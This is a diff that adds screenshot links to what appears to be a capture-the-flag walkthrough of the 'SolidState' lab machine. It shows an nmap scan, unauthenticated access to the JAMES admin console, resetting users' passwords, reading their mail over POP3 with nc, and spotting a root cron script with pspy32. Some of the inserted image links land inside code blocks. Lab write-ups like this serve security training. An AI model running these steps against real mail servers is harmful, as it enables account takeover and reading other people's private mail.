@@ -16,6 +16,8 @@ JAMES Remote Administration Tool (Port 4555) allows unauthenticated access using
 
 Full nmap scan:
 
+![Screenshot](images/Screenshot_2024-08-09_at_5.58.08_PM.png)
+
 ```bash
 nmap -sC -sV -p- -n -Pn --min-rate=9018 10.10.10.51
 ```
@@ -50,6 +52,8 @@ Inside the administration console, we type `help` to list commands and `listuser
 - `james`
 - `thomas`
 - `john`
+
+![Screenshot](images/Screenshot_2024-08-09_at_1.29.00_PM.png)
 - `mindy`
 - `mailadmin`
 
@@ -58,6 +62,8 @@ Since we are inside the admin console, we have the authority to change the passw
 ```text
 setpassword john john
 setpassword mindy mindy
+
+![Screenshot](images/Screenshot_2024-08-09_at_1.30.06_PM.png)
 ```
 
 With the passwords reset, we can now log into the POP3 service on port 110 to read their emails. We use `telnet` or `nc`:
@@ -67,11 +73,15 @@ nc 10.10.10.51 110
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
 +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+
+![Screenshot](images/Screenshot_2024-08-09_at_1.26.05_PM.png)
 ```
 
 We log in as `john`:
 ```text
 USER john
+
+![Screenshot](images/Screenshot_2024-08-09_at_1.23.25_PM.png)
 PASS john
 LIST
 RETR 1
@@ -109,6 +119,8 @@ We execute `pspy32` to watch for recurring background processes:
 ```
 
 After a few minutes, we observe the `root` user executing a Python script every 3 minutes:
+
+![Screenshot](images/Screenshot_2024-08-09_at_5.41.33_PM.png)
 `/opt/tmp.py`
 
 We check the permissions of the script:
